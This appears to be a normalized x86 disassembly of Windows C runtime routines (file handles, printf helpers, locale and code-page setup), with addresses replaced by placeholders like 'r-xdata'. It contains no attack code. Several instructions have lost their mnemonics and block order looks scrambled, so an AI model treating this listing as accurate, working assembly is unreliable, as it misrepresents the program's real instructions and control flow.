inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_440cbb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_442da2
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_43c04c
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_43c072
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_440d30
push 0x10
push r--data
call sub_43f8e0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_43f925
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_440cbb
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440dfc
mov eax [ ebp - 0x1c ]
sub_440e04
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_442da2
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_43c072
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_442da2
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_442da2
push 0x1
mov edi eax
call sub_442da2
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_442d1c
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_440ea0
push 0x10
push r--data
call sub_43f8e0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_43f925
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_440e04
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440f5c
mov eax [ ebp - 0x1c ]
sub_440f64
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_4381f8
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_440f95
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_43917d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_438fc8
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_44ad99
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_44cd54
pop ecx
test eax eax
jne r-xdata
call sub_438fc8
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_44ad99
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_44b922
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_44bda7
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_4410f9
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_440f95
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_44112c
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_4410f9
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_4410f9
sub_44118e
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_438ce6
call sub_43c04c
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_43917d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_441d96
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_440f95
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_441e60
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
pop ebp
retn
call sub_43c04c
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_43f8c5
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_4496ae
call sub_441d96
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_43c04c
mov [ eax ] 0x22
sub_441ed7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_441f66
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_441fff
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_4381f8
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_4381f8
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_4381f8
push [ esi + 0xc0 ]
call sub_4381f8
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_443869
push [ esi + 0xd4 ]
call sub_4381f8
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_4381f8
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4381f8
pop ecx
push [ esi + 0xb0 ]
call sub_4381f8
push [ esi + 0xbc ]
call sub_4381f8
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4381f8
push [ esi + 0xbc ]
call sub_443eb6
pop ecx
pop ecx
push eax
call sub_4381f8
pop ecx
push eax
call sub_4381f8
push [ esi + 0xbc ]
call sub_443c5d
pop ecx
pop ecx
sub_44214a
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_441ed7
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_441f66
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_441fff
pop ecx
sub_442197
push 0xc
push r--data
call sub_43f8e0
call sub_43ffe0
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_44214a
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_442204
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_43ffe0
mov esi [ eax + 0x6c ]
mov eax esi
call sub_43f925
retn
push 0x20
call sub_43b74c
sub_442210
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_44223f
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_43a820
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_4422a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_4461f2
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_43e133
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_43e133
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_43a820
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_442433
push 0xc
push r--data
call sub_43f8e0
call sub_43ffe0
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4424ce
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_43f925
retn
push 0x20
call sub_43b74c
cmp esi rw-data
je r-xdata
push esi
call sub_4381f8
pop ecx
sub_4424d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_442553
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4424d7
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_44223f
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_43a820
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_442210
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_4422a3
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_43a820
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_442210
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_44273c
push 0x14
push r--data
call sub_43f8e0
or [ ebp - 0x20 ] 0xffffffff
call sub_43ffe0
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_442433
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_4424d7
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_43ddd2
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_43f925
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_442553
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
